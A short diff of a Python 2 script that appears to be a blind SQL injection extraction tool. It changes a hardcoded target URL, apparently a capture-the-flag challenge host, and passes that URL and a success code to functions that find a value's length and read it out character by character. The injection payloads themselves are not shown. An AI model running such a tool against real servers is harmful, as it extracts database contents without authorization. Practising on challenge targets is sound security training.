@@ -25,8 +25,9 @@ args = parameter_parsing()
 #	args.base_url = raw_input('Specify URL to work from')
 
 # base_url = args.base_url
-base_url = 'http://35.196.135.216/6b0a1ae546/fetch?id=3'
+base_url = 'http://35.196.135.216/1897f2150e/ticket?id=1	'
 success_code = args.status_code
+
 
 if args.identify:
 	print 'Identifying Database Structure'
@@ -37,7 +38,7 @@ else:
 
 	if args.value_length == None:
 		print "Searching Length"
-		args.value_length = get_length(args.payload)
+		args.value_length = get_length(args.payload, base_url, 200)
 		print "Found Length: %i" % args.value_length
 
-	print "Found value: %s" % get_value(args.payload,args.value_length,args.known_start)
+	print "Found value: %s" % get_value(args.payload,args.value_length,args.known_start, base_url, 200)
